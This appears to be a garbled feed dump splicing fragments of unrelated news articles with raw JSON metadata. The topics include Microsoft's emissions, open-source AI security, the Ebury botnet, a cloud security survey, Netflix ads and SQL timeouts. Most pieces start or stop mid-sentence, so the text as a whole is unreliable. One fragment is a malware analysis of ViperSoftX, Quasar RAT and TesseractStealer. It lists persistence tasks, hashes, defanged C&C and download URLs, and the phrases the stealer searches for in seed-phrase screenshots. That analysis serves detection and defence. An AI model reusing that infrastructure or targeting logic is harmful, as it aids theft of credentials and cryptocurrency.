To meet its targets, Microsoft must quickly adopt green technologies and improve efficiency in its data centers, which are critical for AI but heavily reliant on carbon-intensive resources. Bloomberg reports: Now to meet its goals, the software giant will have to make serious progress very quickly in gaining access to green steel and concrete and less carbon-intensive chips, said Brad Smith, president of Microsoft, in an exclusive interview with Bloomberg Green. \"In 2020, we unveiled what we called our carbon moonshot. That was before the explosion in artificial intelligence,\" he said. \"So in many ways the moon is five times as far away as it was in 2020, if you just think of our own forecast for the expansion of AI and its electrical needs.\" [...]\nDespite AI's ravenous energy consumption, this actually contributes little to Microsoft's hike in emissions -- at least on paper. That's because the company says in its sustainability report that it's 100% powered by renewables. Companies use a range of mechanisms to make such claims, which vary widely in terms of credibility. Some firms enter into long-term power purchase agreements (PPAs) with renewable developers, where they shoulder some of a new energy plant's risk and help get new solar and wind farms online. In other cases, companies buy renewable energy credits (RECs) to claim they're using green power, but these inexpensive credits do little to spur new demand for green energy, researchers have consistently found. Microsoft uses a mix of both approaches. On one hand, it's one of the biggest corporate participants in power purchase agreements, according to BloombergNEF, which tracks these deals. But it's also a huge purchaser of RECs, using these instruments to claim about half of its energy use is clean, according to its environmental filings in 2022. By using a large quantity of RECs, Microsoft is essentially masking an even larger growth in emissions. \"It is Microsoft's plan to phase out the use of unbundled RECs in future years,\" a spokesperson for the company said. \"We are focused on PPAs as a primary strategy.\"\nSo what else can be done? Smith, along with Microsoft's Chief Sustainability Officer Melanie Nakagawa, has laid out clear steps in the sustainability report. High among them is to increase efficiency, which is to use the same amount of energy or computing to do more work. That could help reduce the need for data centers, which will reduce emissions and electricity use. On most things, \"our climate goals require that we spend money,\" said Smith. \"But efficiency gains will actually enable us to save money.\" Microsoft has also been at the forefront of buying sustainable aviation fuels that has helped reduce some of its emissions from business travel. The company also wants to partner with those who will \"accelerate breakthroughs\" to make greener steel, concrete and fuels. Those technologies are starting to work at a small scale, but remain far from being available in commercial quantities even if expensive. Cheap renewable power has helped make Microsoft's climate journey easier. But the tech giant's electricity consumption last year rivaled that of a small European country -- beating Slovenia easily. Smith said that one of the biggest bottlenecks for it to keep getting access to green power is the lack of transmission lines from where the power is generated to the data centers. That's why Microsoft says it's going to increase lobbying efforts to get governments to speed up building the grid. If Microsoft's emissions remain high going into 2030, Smith said the company may consider bulk purchases of carbon removal credits, even though it's not \"the desired course.\"\n\"You've got to be willing to invest and pay for it,\" said Smith.

However, its rapid advancement and widespread adoption raise concerns, especially for those of us in cybersecurity. With so much interest, there are lots of insecure applications finding their way onto our devices and other endpoints, opening more pathways for the \u201cbad guys\u201d to steal our data.\nApplications developed within open-source communities often face more significant security challenges because they are free and widely available, supported by volunteers, and because of other considerations. Even if a major open-source AI project hasn\u2019t already been compromised, it\u2019s only a matter of time until it is.\nSo, let\u2019s explore why open-source AI security is lacking and what security professionals can do to improve it.\nBack to the future: AI is software\nFirst, it\u2019s essential to acknowledge that AI is not something different from software; it is software. As such, it is part of the operation of IT systems and thus part of the software supply chain. AI should be treated the same as any other piece of code or artifact.\nOf equal note, software supply chain security is not purely about web applications, command-line tooling, or other things that are most often thought of when referring to software. It protects every component and process as organizations develop, distribute, and deploy software. You can think of it as cybersecurity applied to the system delivery lifecycle (SDLC). Every stage of software development \u2013 from coding and building to production, deployment, and maintenance \u2013 is involved and needs to be secure.\nWhat can go wrong in the AI software supply chain?\nThe challenges within the AI supply chain mirror those of the broader software supply chain, with added complexity when integrating large language models (LLMs) or machine learning (ML) models into organizational frameworks.\nFor instance, consider a scenario where a financial institution seeks to leverage AI models for loan risk assessment. This application demands meticulous scrutiny of the AI model\u2019s software supply chain and training data origins to ensure compliance with regulatory standards, such as prohibiting protected categories in loan approval processes.\nTo illustrate, let\u2019s examine how a bank integrates AI models into its loan risk assessment procedures. Regulations mandate strict adherence to loan approval criteria, forbidding the use of race, sex, national origin, and other demographics as determining factors. Thus, the bank must consider and assess the AI model\u2019s software and training data supply chain to prevent biases that could lead to legal or regulatory complications.\nThis issue extends beyond individual organizations. The broader AI technology ecosystem faces concerning trends. Recent research indicates an inverse relationship between the security posture of open-source AI software tools and their popularity. Put simply, the more widely adopted an open-source AI tool or model, the greater the security vulnerabilities it may possess.\nFurthermore, the prevalence of open-source AI models trained on potentially illegal or unethical data poses significant legal and regulatory risks for users. This exposure highlights the imperative for enhanced measures within the AI supply chain to guarantee safe and secure usage. While the future of AI holds promise, addressing these challenges is paramount to its responsible adoption and sustained success.\nWhat security professionals can do\nSecuring open source requires focus across multiple avenues including:\nSecurity specifications: Advocate for greater transparency and accountability within the open-source community, demanding essential security metadata such as Software Bill of Materials (SBOMs), SLSA (Supply Chain Levels for Software Artifacts), and SARIF (Static Analysis Results Interchange Format).\n-\nOpen-source security tools: Collaborate with companies that offer support for security projects, such as Allstar, GUAC, and in-toto attestations, to bear some liability while still benefiting from open-source innovation.\n-\nIndustry contributions and funding to open source: Supporting organizations like the Open Source Security Foundation (OpenSSF), which develops specifications, tools, and initiatives to secure critical open source projects, is essential.\n-\nCISOs and their security teams need information about the software in their organization\u2019s environments to ensure its security. With this information, CISOs can make informed, risk-based decisions about the software components they integrate into their environments. Relying on volunteer efforts for security without contribution or investment is unsustainable and ineffective.", "hash": "13e3cc68a0c4186b5d768d40f54c4e727a53a1ec58120142c6435e680f0c6d1c", "id": "76c390ab-1c74-4ae8-b7ba-6147e021b30c", "link": "https://www.helpnetsecurity.com/2024/05/16/open-source-ai-security/", "osint_source_id": "c5bebd4b-5715-4589-a65c-0344a226ab6f", "published": "2024-05-16T05:30:01", "source": "https://www.helpnetsecurity.com/feed", "story_id": "721bf5bf-e327-4cca-b5b5-55a6dd1a2984", "title": "Is an open-source AI vulnerability next?"}], "tags": {"GUAC": {"name": "GUAC", "tag_type": "ORG"}, "OpenSSF": {"name": "OpenSSF", "tag_type": "MISC"}, "SARIF": {"name": "SARIF", "tag_type": "MISC"}, "SBOMs": {"name": "SBOMs", "tag_type": "MISC"}, "SDLC": {"name": "SDLC", "tag_type": "MISC"}, "supply chain": {"name": "supply chain", "tag_type": "Cybersecurity"}}, "title": "Is an open-source AI vulnerability next?"}, {"attributes": [{"created": "2024-05-16T09:12:45.423639", "id": "b1c75eff-2d8e-45c8-b92c-ddbb7604ba21", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T09:19:01.275910", "id": "4902a193-5929-4340-a743-7782704ac817", "key": "NLP_BOT", "value": "4"}], "created": "2024-05-16T05:30:00", "id": "932b606e-1e83-4bf7-bc17-5cbfae149523", "news_items": [{"author": "msmash", "content": "Wallet Recovery Firms Buzz as Locked-out Crypto Investors Panic in Bitcoin Boom (reuters.com) 9\nThe recent surge in bitcoin prices has the phones at crypto wallet recovery firms ringing off the hook, as retail investors locked out of their digital vaults make frantic calls to regain access to their accounts. From a report: Cryptocurrencies exist on a decentralized digital ledger known as blockchain and investors may opt to access their holdings either through a locally stored software wallet or a hardware wallet, to avoid risks related to owning crypto with an exchange, as in the case of the former FTX. Losing access to a crypto wallet is a well-known problem. Investors forgetting their intricate passwords is a primary reason, but loss of access to two-factor authentication devices, unexpected shutdowns of cryptocurrency exchanges and cyberattacks are also common.\nWallet passwords are usually alphanumeric and the wallet provider also offers a set of randomized words, known as \"seed phrases,\" for additional security - both these are known only to the user. If investors lose the passwords and phrases, access to their wallets is cut off. With bitcoin prices regaining traction since last October and hitting a record high of $73,803.25 in March, investors seem to be suffering from a classic case of FOMO, or the fear of missing out. Reuters spoke to nearly a dozen retail investors who had lost access to their crypto wallets.

It is used to deploy additional malware to monetize the botnet (such as modules for web traffic redirection), proxy traffic for spam, perform adversary-in-the-middle attacks (AitM), and host supporting malicious infrastructure. In AitM attacks, ESET has observed over 200 targets across over 75 networks in 34 countries between February 2022 and May 2023.\nIts operators have used the Ebury botnet to steal cryptocurrency wallets, credentials, and credit card details. ESET has uncovered new malware families authored and deployed by the gang for financial gain, including Apache modules and a kernel module to redirect web traffic. Ebury operators also used zero-day vulnerabilities in administrator software to compromise servers in bulk.\nAfter a system is compromised, several details are exfiltrated. Using the known passwords and keys obtained on that system, credentials are reused to try logging into related systems. Each Ebury\u2019s major version introduces important changes, new features, and obfuscation techniques.\n\u201cWe have documented cases where the infrastructure of hosting providers was compromised by Ebury. In these cases, we have seen Ebury being deployed on servers rented out by those providers, with no warning to the lessees. This resulted in cases where the Ebury actors were able to compromise thousands of servers at once,\u201d says Marc-Etienne M. L\u00e9veill\u00e9, the ESET researcher who investigated Ebury for more than a decade. There is no geographical boundary to Ebury; there are servers compromised with Ebury in almost all countries in the world. Whenever a hosting provider was compromised, it led to a vast number of compromised servers in the same data centers.\nAt the same time, no verticals appear more targeted than others. Victims include universities, small and large enterprises, internet service providers, cryptocurrency traders, Tor exit nodes, shared hosting providers, and dedicated server providers, to name a few.\nIn late 2019, the infrastructure of a large and popular US-based domain registrar and web hosting provider was compromised. In total, approximately 2,500 physical and 60,000 virtual servers were compromised by the attackers. A very large portion, if not all, of these servers are shared between multiple users to host the websites of more than 1.5 million accounts. In another incident, a total of 70,000 servers from that hosting provider were compromised by Ebury in 2023. Kernel.org, hosting the source code of the Linux kernel, had been a victim of Ebury too.\n\u201cEbury poses a serious threat and a challenge to the Linux security community. There is no simple fix that would make Ebury ineffective, but a handful of mitigations can be applied to minimize its spread and impact. One thing to realize is that it doesn\u2019t only happen to organizations or individuals that care less about security. A lot of very tech-savvy individuals and large organizations are among the list of victims,\u201d concludes L\u00e9veill\u00e9.", "hash": "d18ad3407a2cffbb49f1c024ac900b708c5f3c998f250eef06f476eb3da1d8f8", "id": "6478cd58-f050-4a7d-a1f2-bda7c4ee2172", "link": "https://www.helpnetsecurity.com/2024/05/16/ebury-botnet/", "osint_source_id": "c5bebd4b-5715-4589-a65c-0344a226ab6f", "published": "2024-05-16T04:30:55", "source": "https://www.helpnetsecurity.com/feed", "story_id": "2d256083-0abe-41dd-9427-d6cd8200e859", "title": "Ebury botnet compromises 400,000+ Linux servers"}], "tags": {"AitM": {"name": "AitM", "tag_type": "MISC"}, "ESET": {"name": "ESET", "tag_type": "ORG"}, "Ebury": {"name": "Ebury", "tag_type": "LOC"}, "FreeBSD": {"name": "FreeBSD", "tag_type": "MISC"}, "ISPs": {"name": "ISPs", "tag_type": "MISC"}, "Linux": {"name": "Linux", "tag_type": "MISC"}, "L\u00e9veill\u00e9": {"name": "L\u00e9veill\u00e9", "tag_type": "PER"}, "OpenBSD": {"name": "OpenBSD", "tag_type": "MISC"}, "OpenSSH": {"name": "OpenSSH", "tag_type": "MISC"}, "US-based": {"name": "US-based", "tag_type": "MISC"}, "zero-day": {"name": "zero-day", "tag_type": "Cybersecurity"}}, "title": "Ebury botnet compromises 400,000+ Linux servers"}, {"attributes": [{"created": "2024-05-16T09:10:02.029077", "id": "4385ee0d-91a8-443f-ab15-93fdf53adf73", "key": "WORDLIST_BOT", "value": "2"}, {"created": "2024-05-16T09:20:21.619290", "id": "eba17f73-aceb-4996-886b-ed8ab04f0e15", "key": "NLP_BOT", "value": "9"}], "created": "2024-05-16T04:00:02", "id": "9dd10819-059e-4039-b343-4cde04670755", "news_items": [{"author": "Help Net Security", "content": "Product showcase: Block ads, cookie pop-ups, trackers with CleanWeb\nA study by PageFair revealed that ad blocker usage surged by 30% in 2016 alone, reflecting a growing public concern for privacy and uninterrupted browsing.\nFast-forward to today, and the numbers are even more dramatic.

This trend underscores the escalating risk landscape in cloud environments.\nThe 2024 Cloud Security Report gathers insights from over 800 cloud and cybersecurity professionals.\nCloud security incidents on the rise\nThe latest survey from Check Point reveals a concerning trend: while most organizations continue to prioritize threat detection and monitoring, focusing on known vulnerabilities and patterns of malicious behavior, only a mere 21% emphasize prevention. This is particularly alarming as companies struggle to keep pace with rapid technological advancements, including the speed of DevOps and the deployment of new codes and applications in the cloud.\nAlthough cloud attacks are on the rise, only 4% of organizations disclosed that they are able to mitigate risks easily and quickly. An overwhelming 96% have expressed concern about their ability to handle such risks. In addition, 91% of respondents are alarmed by the surge in more sophisticated cyber threats, including unknown risks and zero-day attacks, which cannot be detected using conventional security tools.\n\u201cThe data speaks volumes about the urgent need for organizations to shift their focus towards implementing AI-powered threat prevention measures,\u201d states Itai Greenberg, Chief Strategy Officer at Check Point Software Technologies. \u201cBy adopting a consolidated security architecture and enhancing collaborative security operations, businesses can preemptively tackle emerging threats, ensuring a more secure and resilient cloud environment.\u201d\nRegulatory hurdles in multi-cloud environments\nThere has been a near 40% increase in cloud security incidents compared to last year, with 61% of organizations reporting significant disruptions. An overwhelming 96% of respondents reported concerns about their ability to effectively manage cloud risks, reflecting a considerable escalation from previous years.\nWith 91% of organizations now prioritizing AI to enhance their security posture, the focus has shifted towards leveraging AI for proactive threat prevention. Despite the growing threat landscape, only 25% of organizations have fully implemented Cloud Native Application Protection Platforms (CNAPP). This underscores the urgent need for comprehensive solutions that go beyond traditional tooling.\nDespite potential for streamlined solutions, 54% of respondents face challenges in maintaining consistent regulatory standards across multi-cloud environments. Additionally, 49% struggle with integrating cloud services into legacy systems, often complicated by limited IT resources.\nIt is common for organizations to identify millions of potential issues upon scanning their cloud environment \u2014 most are not harmful unless malicious actors can exploit them. To combat this challenge, vendors have implemented \u2018attack graphs\u2019 to group and correlate static misconfigurations and vulnerabilities to better prioritize alerts.

However, their project was forced to stop this month after the city got word of what was going on. SFGate reports: According to a city press release, scientists were ordered to halt the experiment because it violated Alameda's lease with the USS Hornet, the aircraft carrier from which researchers were spraying saltwater into the air using \"a machine resembling a snowmaker.\" The news was first reported by the Alameda Post. \"City staff are working with a team of biological and hazardous materials consultants to independently evaluate the health and environmental safety of this particular experiment,\" the press release states. Specifically, chemicals present in the experiment's aerosol spray are being evaluated to study whether or not they pose any threats to humans, animals or the environment. So far, there isn't any evidence that they do, the city stated.\nThe prospect of a city-conducted review was not unexpected, the University of Washington said in a statement shared with SFGATE. \"In fact, the CAARE (Coastal Aerosol Research and Engagement) facility is designed to help regulators, community members and others engage with the research closely, and we consider the current interactions with the city to be an integral part of that process,\" the statement reads. \"We are happy to support their review and it has been a highly constructive process so far.\" The marine cloud brightening (MCB) technique involves spraying fine particles of sea salt into the atmosphere from ships or specialized machines. These sea salt particles are chosen because they are a natural source of cloud-forming aerosols and can increase the number of cloud droplets, making the clouds more reflective. The particles sprayed are extremely small, about 1/1000th the width of a human hair, ensuring they remain suspended in the air and interact with cloud droplets effectively.\nBy reflecting more sunlight, these brightened clouds can reduce the amount of solar energy reaching the Earth's surface, leading to localized cooling. If implemented on a large scale, this cooling effect could potentially offset some of the warming caused by greenhouse gases.\nYou can learn more about the experiment here.\nThe prospect of a city-conducted review was not unexpected, the University of Washington said in a statement shared with SFGATE. \"In fact, the CAARE (Coastal Aerosol Research and Engagement) facility is designed to help regulators, community members and others engage with the research closely, and we consider the current interactions with the city to be an integral part of that process,\" the statement reads. \"We are happy to support their review and it has been a highly constructive process so far.\" The marine cloud brightening (MCB) technique involves spraying fine particles of sea salt into the atmosphere from ships or specialized machines.

In addition, creativity is more than a vague and nebulous attribute that either is or isn\u2019t present when it\u2019s needed. A short article by [Anthony D. Fredericks] gives some practical and useful tips on energizing and exercising one\u2019s creativity.\nWhy would creative thinking be meaningful to a technical person? The author shares an anonymous observation that as children we\u2019re taught to stay inside the lines, while as adults we are often expected to think outside the box. Certainly when it comes to technical tasks, our focus is more on logical thinking. But problem solving benefits as much from creative thinking as it does from more logical approaches.\nHow can one cultivate creative thinking? The main idea is that creativity is best flexed and exercised by actively looking for connections and similarities between highly dissimilar elements, rather than focusing on their differences. Some thought exercises are provided to help with this process. Like with any exercise, the more one does it, the better one becomes.\nPracticing more creative thinking can help jolt new ideas and approaches to a tough problem, so give it a shot. It\u2019s also worth keeping in mind that we all need a feeling of progress, especially during extended times of applying effort to something, so do yourself a favor and give yourself an occasional win.\n2 thoughts on \u201cThink Again: Tips On Finding And Flexing Your Creativity\u201d\nOkay, so\u2026 I\u2019ve been studying psychology for a couple of years now, with a focus on creativity.\nThe article states a claim: that creativity lies in looking for similarities rather than differences.\nI\u2019ve never seen this claim before, and I\u2019ve read several books on creativity and am familiar with numerous psychological aspects of creativity in the literature. Such as whether creatives are more likely to have mental illness, the overjustification effect (there\u2019s a wikipedia page for that) and so on.\nSo my first question is this: is his position a recognized belief in the field, backed up by studies?\nIf the answer is \u201cyes\u201d, can anyone post a link to papers that test this? I\u2019d be very interested in this.\nIf the answer is \u201cno\u201d, then is this just a well-meaning professional with years of experience just writing down something he believes is true?\nSetting aside the article, for people who want to be more creative, the best quick \u201chow to\u201d I\u2019ve seen is a video lecture by John Cleese. His findings track with findings I\u2019ve found from other researchers in the field, and I actually use this technique myself. Get into the open mode and you become lots more creative.\nhttps://www.youtube.com/watch?v=Pb5oIIPO62g\n(I\u2019ve also read John Cleese\u2019s book, which says essentially what\u2019s in the video.)\nFirst step is to take care of the body, really. The classical Greeks didn\u2019t have this newer dual concept in which the mind is thought of as somehow magically separate and independent from the body, or that you have to choose to exercise either the mind OR the body. It was always both; a sound mind in a sound body as one.\nNietzsche always said not to trust any thought which did not come to you while standing upright outside, under the sun.

This move pits it against other industry heavyweights with ad servers, like Google, Amazon and Comcast. The announcement signifies a significant shake-up in the streaming giant's advertising approach. The company originally partnered with Microsoft to develop its ad tech, letting Netflix enter the ad space quickly and catch up with rivals like Hulu, which has had its own ad server for over a decade.\nWith the launch of its in-house ad tech, Netflix is poised to take full control of its advertising future. This strategic move will empower the company to create targeted and personalized ad experiences that resonate with its massive user base of 270 million subscribers. [...] Netflix didn't say exactly how its in-house solution will change the way ads are delivered, but it's likely it'll move away from generic advertisements. According to the Financial Times, Netflix wants to experiment with \"episodic\" campaigns, which involve a series of ads that tell a story rather than delivering repetitive ads. During the presentation, Netflix also noted that it'll expand its buying capabilities this summer, which will now include The Trade Desk, Google's Display & Video 360 and Magnite as partners. Notably, competitor Disney+ also has an advertising agreement with The Trade Desk. Netflix also touted the success of its ad-supported tier, reporting that 40 million global monthly active users opt for the plan. The ad tier had around 5 million users within six months of launching.\nWith the launch of its in-house ad tech, Netflix is poised to take full control of its advertising future.

ViperSoftX is a malware strain responsible for residing on infected systems and executing the attackers\u2019 commands or stealing cryptocurrency-related information.\nThe malware newly discovered this time utilizes the open-source OCR engine Tesseract. Tesseract extracts texts from images using deep learning techniques. The malware used in the attack reads images stored on the infected systems and extracts strings using the Tesseract tool. If the extracted strings contain any phrases related to passwords or cryptocurrency wallet addresses, the malware exfiltrates those images.\nThis post will briefly summarize the ViperSoftX malware that has been circulating for several years. It will focus primarily on the differences observed in the latest version and the malware types propagated by attackers using ViperSoftX since features like executing basic commands and stealing cryptocurrency wallet addresses already have detailed analysis materials available. The attackers are continuously using ViperSoftX installed on multiple systems to install more malware strains with notable examples being Quasar RAT and TesseractStealer.\n1. ViperSoftX\nViperSoftX is a malware strain that can control infected systems and steal information, often distributed by being disguised as cracks or keygens for legitimate software. First identified by Fortinet in 2020, ViperSoftX installs both RAT malware strains capable of controlling infected systems and Infostealers designed to capture cryptocurrency wallet addresses [1].\nIn 2022, Avast reported a new activity related to ViperSoftX. Instead of using JavaScript, it employed PowerShell scripts and expanded its capabilities to include features such as changing clipboards and installing additional payloads in addition to stealing cryptocurrency wallet addresses. Furthermore, the malware utilized VenomSoftX to install malicious browser extensions on Chrome-based web browsers to steal information [2]. TrendMicro\u2019s 2023 report covered the distribution methods of ViperSoftX, showing how routines were added to check if password managers like \u201cKeePass 2\u201d and \u201c1Password\u201d were installed compared to the previous versions [3].\n2. ViperSoftX Involved in Malware Distribution\nThe recently distributed ViperSoftX is similar to the type disclosed by Fortinet in the past, as it transmits information about the infected system such as computer names, user names, installed security products, and cryptocurrency-related data. However, there are differences such as encrypting the User-Agent containing this information with the Base64 algorithm and using the keyword \u201cWelcome_2025\u201d instead of \u201cviperSoftx\u201d.\nThe attackers installed a dropper named \u201cwin32.exe\u201d to update ViperSoftX. The dropper contains malware strains named \u201cSvchost.exe\u201d and \u201cSystem32.exe\u201d in its internal resources and ultimately registers a PowerShell script named \u201cupdate.ps1\u201d in the Task Scheduler.\n\u201cupdate.ps1\u201d generates the actual ViperSoftX PowerShell script and registers it in the Task Scheduler. As a result, tasks named \u201cCheck system\u201d and \u201cChromeniumscrypt\u201d are created to execute \u201cupdate.ps1\u201d located in the paths %PROGRAMDATA% and %PUBLIC% respectively.\nUnlike the past versions which supported six commands, the recent iteration of ViperSoftX features only three commands: \u201cDwnlExe\u201d, \u201cCmd\u201d, and \u201cSelfRemove\u201d.\nIn addition, there are also PowerShell scripts that download and execute external commands and VenomSoftX PowerShell scripts responsible for installing browser extension malware strains. The PowerShell scripts are registered in the Task Scheduler to run continuously on the system, ensuring they are updated regularly.\nThreat actors can utilize the installed ViperSoftX on the infected system to install additional malware, with cases confirming the installation of Quasar RAT or TesseractStealer.\n3. Quasar RAT\nQuasar RAT is an open-source RAT malware developed with .NET. Like most other RAT malware types, it provides system tasks like processes, files, and registries, and features such as remote command execution and the ability to download and upload files. It can also steal user environment information with its keylogging and account credentials collecting features and allow the attackers to take control of the infected system in real time via the remote desktop feature.\nThe attackers have been distributing Quasar RAT using ViperSoftX, a practice that has been observed at least since July 2023. They seem to be distributing Quasar RAT to multiple infected systems in bulk rather than targeting specific individuals. Especially since March 2024, numerous cases of Quasar RAT installation have been consistently observed on a large number of systems.\nMost of the Quasar RATs used in the attacks have no significant distinguishing features, but recently, cases utilizing the Tor network have also been identified. The malware installs the Tor web browser and then uses it as a proxy server to communicate with the C&C server. The actual C&C server address stored in the configuration information also uses an Onion domain.\n4. TesseractStealer\nThe attackers installed an infostealer in addition to Quasar RAT. This post will refer to it as TesseractStealer. TesseractStealer utilizes the open-source OCR engine Tesseract, which supports a feature to extract texts from images using deep learning techniques [4].\nTesseractStealer first creates the Tesseract (tesseract50.dll) and Leptonica (leptonica-1.82.0.dll) library files present in the resources and the training data file (eng.traineddata) along with the font file (pdf.ttf). It finds the image files existing in the system, specifically \u201c.png\u201d, \u201c.jpg\u201d, and \u201c.jpeg\u201d files, excluding those located in the \u201ceditor\u201d directory.\nThen it utilizes the installed Tesseract library to extract strings from each image file. It checks if the extracted strings contain the following strings. If those strings are present, it sends the image files to the C&C server.\nThe inspected strings are all related to OTPs, passwords required for recovery, cryptocurrency wallet addresses, and other similar strings. In other words, attackers seem to target users who store cryptocurrency wallet address or password information by capturing screenshots and saving them as image files, with the aim of stealing them. For example, the phrase \u201cYour wallet generation seed is\u201d is likely to target the seed phrase required during the generation of an Electrum wallet address. The attackers can use the stolen seed phrase to restore the wallet and steal the cryptocurrency.\n5. Conclusion\nThe recent activities of the ViperSoftX malware that controls infected systems and steals user information have been noticeably increasing. ViperSoftX is known to be primarily distributed by being disguised as cracks or keygens for legitimate applications and installs additional malware while persistently residing on the infected system. Recently, attackers have been using ViperSoftX to install Quasar RAT and TesseractStealer. TesseractStealer utilizes an image extraction tool called Tesseract to capture screenshots of the user\u2019s image files, specifically targeting passwords and cryptocurrency-related screenshots.\nUsers should exercise caution when downloading executables from suspicious websites or file-sharing sites. It is strongly recommended to download programs such as tools and games only from their official websites. Also, V3 should be updated to the latest version so that malware infection can be prevented.\nFile Detection\n\u2013 Backdoor/Win32.QuasarRAT.R341693 (2020.06.27.06)\n\u2013 Trojan/Win.Generic.C5440564 (2023.06.13.01)\n\u2013 Trojan/Win32.Agent.C2862808 (2018.11.28.00)\n\u2013 Trojan/Win32.RL_Downeks.C4069173 (2020.04.19.01)\n\u2013 Infostealer/Win.Tesseract.R646594 (2024.04.29.02)\n\u2013 Trojan/Win32.Subti.R285137 (2019.08.06.05)\n\u2013 Trojan/PowerShell.ViperSoftX (2024.04.29.03)\n\u2013 Downloader/Powershell.ViperSoftX.SC199376 (2024.04.29.02)\n\u2013 Downloader/Powershell.ViperSoftX.S2677 (2024.05.03.03)\n\u2013 Trojan/JOB.ViperSoftX.S2679 (2024.04.29.02)\n\u2013 Trojan/JOB.ViperSoftX.S2680 (2024.04.29.02)\nAMSI Detection\n\u2013 Downloader/Powershell.ViperSoftX.SA2678 (2024.05.03.03)\nBehavior Detection\n\u2013 Malware/MDP.Inject.M2907\n\u2013 Execution/MDP.Powershell.M1185\n\u2013 Execution/MDP.Powershell.M1201\nIoCs\nMD5s\n\u2013 f9bb6ef02f29f52ff126279ff7d044bb: ViperSoftX Dropper (win32.exe)\n\u2013 bdd3d30ea4bc94d1240ea75f1aa212eb: ViperSoftX Installer (Svchost.exe)\n\u2013 f52616c47b243f3373248ed2a5f49e1c: ViperSoftX Installer (System32.exe)\n\u2013 c21b68dae810444cc013722e97b77802: ViperSoftX PowerShell Installer (update.ps1)\n\u2013 d9a4b64d20c6860f12b6da0ecd53983a: ViperSoftX PowerShell (update.ps1)\n\u2013 4373f159c79da9ecf7a05b81868c3a97: ViperSoftX Downloader PowerShell\n\u2013 240766d7b6b936fad871ea1a7fefc141: VenomSoftX PowerShell (Decrypted)\n\u2013 c00e53e8cbb5701157002091db4a2500: Quasar RAT \u2013 July 2023 (microsoft.exe)\n\u2013 3b20a80251740bb4443968cdd125b99d: Quasar RAT \u2013 July 2023 (csrss.exe)\n\u2013 fffb28442b89e1387b30a40cbb211570: Quasar RAT \u2013 July 2023 (NVIDIA.exe)\n\u2013 66bdc2d36d460fb25bb2114f770d5ade: Quasar RAT \u2013 after March 2024 (powershells.exe)\n\u2013 06cba6b21f02f980f755da363dfc50a8: Quasar RAT \u2013 after March 2024 (dllhost.exe)\n\u2013 6987e127bc6c12fcb9f1876e8ecf64d1: Quasar RAT \u2013 after March 2024 (conhost.exe)\n\u2013 862d9a823ae99b9181b749ae66198bca: Quasar RAT \u2013 Tor, after March 2024 (java.exe)\n\u2013 4c96de9869538349c8daae65342ad94c: TesseractStealer (56cb4553-d33a-42b8-8d77-bb3f279f5191.x)\nC&C Servers\n\u2013 hxxp://mysystemes[.]com:80/connect: ViperSoftX PowerShell\n\u2013 hxxp://xboxwindows[.]com/api/v1/: ViperSoftX DownLoader PowerShell\n\u2013 bideo.duckdns[.]org:15: Quasar RAT (July 2023)\n\u2013 bideo.duckdns[.]org:2: Quasar RAT (July 2023)\n\u2013 bideo.duckdns[.]org:7: Quasar RAT (July 2023)\n\u2013 mvps-remote.duckdns[.]org:103: Quasar RAT (after March 2024)\n\u2013 youtubevideos.duckdns[.]org:5: Quasar RAT (after March 2024)\n\u2013 win32updates.duckdns[.]org:1: Quasar RAT (after March 2024)\n\u2013 x75tjpwatl2uyunijiq6jwqhlar3j5fkpi5optv7tfreijbpylwnnbqd[.]onion:8880: Quasar RAT (after March 2024)\n\u2013 hxxps://22.rooz2024.workers[.]dev: TesseractStealer\nDownload URLs\n\u2013 hxxps://www.uplooder[.]net/f/tl/92/fd73d54c0013b987b9f3b66d839975d9/csrss.exe: Quasar RAT\n\u2013 hxxp://rooz2024[.]com/wfdfsgfsgdh/wfin.x: TesseractStealer\nReference Material\n\u2013 Strings used for selecting target images for stealing\n\u201cif you have any problem with scanning the qr\u201d,\u201cenable google authentication\u201d,\n\u201cwrite down each word\u201d,\n\u201cwrite down your secret phrase\u201d,\n\u201cdo not create a digital copy such as a screenshot\u201d,\n\u201cwrite down or copy these words\u201d,\n\u201cdo not share your phrase to anyone\u201d,\n\u201cyou will be shown a secret phrase on the next screen\u201d,\n\u201cyour wallet generation seed is\u201d,\n\u201cplease save these 12 words\u201d,\n\u201cwrite down this 12-word secret recovery\u201d,\n\u201cPlease write down the following words and keep them in a secure place\u201d,\n\u201cWarning: Do not share these words with anyone.

The results, if any, should be discarded.\\r\\nOperation cancelled by user.\". This cancellation happens before the CommandTimeout duration is met in the SQL Client application, normally, asynchronous database operations that the CancellationToken setting is reached. Following I would like to share with you my lessons learned. \n \nThe customer application was running asynchronous database operations and two primary types of cancellations can occur:\n \n\nA CommandTimeout cancellation typically indicates that the query is taking longer than expected, possibly due to database performance issues or query complexity. On the other hand, a cancellation triggered by a CancellationToken may be due to application logic deciding to abort the operation, often in response to user actions or to maintain application responsiveness.\n\n \nError Handling and Connection Resilience:\n \nErrors during query execution, such as syntax errors or references to non-existent database objects, necessitate immediate attention and are not suitable for retry logic. The application must distinguish these errors from transient faults, where retry logic with exponential backoff can be beneficial. Moreover, connection resilience is paramount, and implementing a retry mechanism for establishing database connections ensures that transient network issues do not disrupt application functionality.\n \nMeasuring Query Execution Time:\n \nGauging the execution time of queries is instrumental in identifying performance bottlenecks and optimizing database interactions. The example code demonstrates using a Stopwatch to measure and log the duration of query execution, providing valuable insights for performance tuning.\n \nAdaptive Timeout Strategy:\n \nThe code snippet illustrates an adaptive approach to handling query cancellations due to timeouts. By dynamically adjusting the CommandTimeout and CancellationToken timeout values upon encountering a timeout-related cancellation, the application attempts to afford the query additional time to complete in subsequent retries, where feasible.\n \nTests and Results:\n \nI conducted a series of tests to understand the behavior under different scenarios and the corresponding exceptions thrown by the .NET application. Here are the findings:\n \n\nCancellation Prior to Query Execution:\n\nScenario: The cancellation occurs before the query gets a chance to execute, potentially due to reasons such as application overload or a preemptive cancellation policy.\nException Thrown: TaskCanceledException\nInternal Error Message: \"A task was canceled.\"\nExplanation: This exception is thrown when the operation is canceled through a CancellationToken, indicating that the asynchronous task was canceled before it could begin executing the SQL command. It reflects the application's decision to abort the operation, often to maintain responsiveness or manage workload.\n\nCancellation Due to CommandTimeout:\n\nScenario: The cancellation is triggered by reaching the CommandTimeout of SqlCommand, indicating that the query's execution duration exceeded the specified timeout limit.\nException Thrown: SqlException with an error number of -2\nInternal Error Message: \"Execution Timeout Expired. The timeout period elapsed prior to completion of the operation or the server is not responding.\"\nExplanation: This exception occurs when the query execution time surpasses the CommandTimeout value, prompting SQL Server to halt the operation. It suggests that the query may be too complex, the server is under heavy load, or there are network latency issues.\n\nCancellation Before CommandTimeout is 